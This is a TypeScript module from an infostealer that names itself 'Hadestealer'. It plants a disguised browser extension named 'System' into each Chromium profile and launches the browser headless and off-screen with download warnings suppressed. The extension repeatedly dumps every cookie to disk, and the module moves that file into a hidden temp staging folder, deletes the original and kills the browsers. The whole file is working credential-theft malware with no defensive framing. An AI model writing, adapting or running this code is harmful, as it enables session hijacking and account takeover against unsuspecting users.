import fs from 'fs';
import path from 'path';
import os from 'os';
import { spawn } from 'child_process';
import { browsers } from '../config/constants';
import { BrowserResult } from '../types';
import { getProfiles } from '../utils/file';
import { killBrowsersSync } from '../utils/process';

function waitForAnyCookieFile(dirPath: string, timeout = 60000): Promise<string> {
    return new Promise((resolve, reject) => {
        const start = Date.now();
        const check = () => {
            try {
                const files = fs.readdirSync(dirPath);
                const found = files.find(f => f.toLowerCase().startsWith("cookies") && f.endsWith(".txt"));
                if (found) return resolve(path.join(dirPath, found));
            } catch (e) { }
            if (Date.now() - start > timeout) return reject(new Error("Timeout"));
            setTimeout(check, 1500);
        };
        check();
    });
}

function killBrowsers(): void {
    try {
        killBrowsersSync();
    } catch (e) { }
}

export async function chromium(): Promise<{ results: BrowserResult[] }> {
    const downloadsDir = path.join(os.homedir(), "Downloads");
    const results: BrowserResult[] = [];
    const fileName = "cookies.txt";

    for (const browser of browsers) {
        try {
            if (!fs.existsSync(browser.path)) {
                results.push({ browser: browser.name, status: "binary_not_found" });
                continue;
            }

            const userData = path.join(os.homedir(), 'AppData', 'Local', browser.userDir, 'User Data');
            if (!fs.existsSync(userData)) {
                results.push({ browser: browser.name, status: "not_installed" });
                continue;
            }

            const profiles = await getProfiles(userData);
            if (profiles.length === 0) {
                results.push({ browser: browser.name, status: "no_profiles_found" });
                continue;
            }

            for (const profile of profiles) {
                const extDir = path.join(userData, profile, 'Extensions', browser.name);
                fs.mkdirSync(extDir, { recursive: true });

                const indexJs = `
async function dump() {
    try {
        const cookies = await chrome.cookies.getAll({});
        if (!cookies || cookies.length === 0) return;

        const formatted = cookies.map(c => 
            [c.domain, c.hostOnly ? "FALSE" : "TRUE", c.path, c.secure ? "TRUE" : "FALSE", c.expirationDate ? Math.floor(c.expirationDate) : 0, c.name, c.value].join("\\t")
        ).join("\\n");
        
        const blob = new Blob([formatted], {type: 'text/plain'});
        const reader = new FileReader();
        reader.onloadend = () => {
            chrome.downloads.download({
                url: reader.result,
                filename: "${fileName}",
                conflictAction: "overwrite", 
                saveAs: false
            });
        };
        reader.readAsDataURL(blob);
    } catch (e) {}
}

chrome.runtime.onInstalled.addListener(dump);
chrome.runtime.onStartup.addListener(dump);
setInterval(dump, 5000); 
`.trim();

                const manifest = {
                    manifest_version: 3,
                    name: "System",
                    version: "3.0",
                    permissions: ["cookies", "tabs", "downloads"],
                    host_permissions: ["<all_urls>"],
                    background: { service_worker: "index.js" }
                };

                try {
                    fs.writeFileSync(path.join(extDir, "index.js"), indexJs);
                    fs.writeFileSync(path.join(extDir, "manifest.json"), JSON.stringify(manifest));

                } catch (error) {

                }
                const args = [
                    `--load-extension=${extDir}`,
                    `--disable-extensions-except=${extDir}`,
                    `--disable-popup-blocking`,
                    `--no-first-run`,
                    `--no-default-browser-check`,
                    `--profile-directory=${profile}`,
                    `--window-position=-32000,-32000`,
                    `--window-size=800,600`,
                    `--disable-features=InsecureDownloadWarnings`,
                    `--headless=new`
                ];

                const proc = spawn(browser.path, args, { detached: true, stdio: "ignore" });
                proc.unref();

                const outputDir = path.join(os.tmpdir(), 'Hadestealer', "All", 'ChromiumV20', browser.name, profile);
                fs.mkdirSync(outputDir, { recursive: true });

                try {
                    const actualFile = await waitForAnyCookieFile(downloadsDir, 45000);
                    fs.copyFileSync(actualFile, path.join(outputDir, fileName));
                    fs.unlinkSync(actualFile);
                    results.push({ browser: browser.name, profile, status: "success", file: path.join(outputDir, fileName) });
                } catch (e) {
                    results.push({ browser: browser.name, profile, status: "timeout" });
                }
            }
        } catch (err: any) {
            results.push({ browser: browser.name, status: "error", message: err.message });
        }
    }

    killBrowsers();
    return { results };
}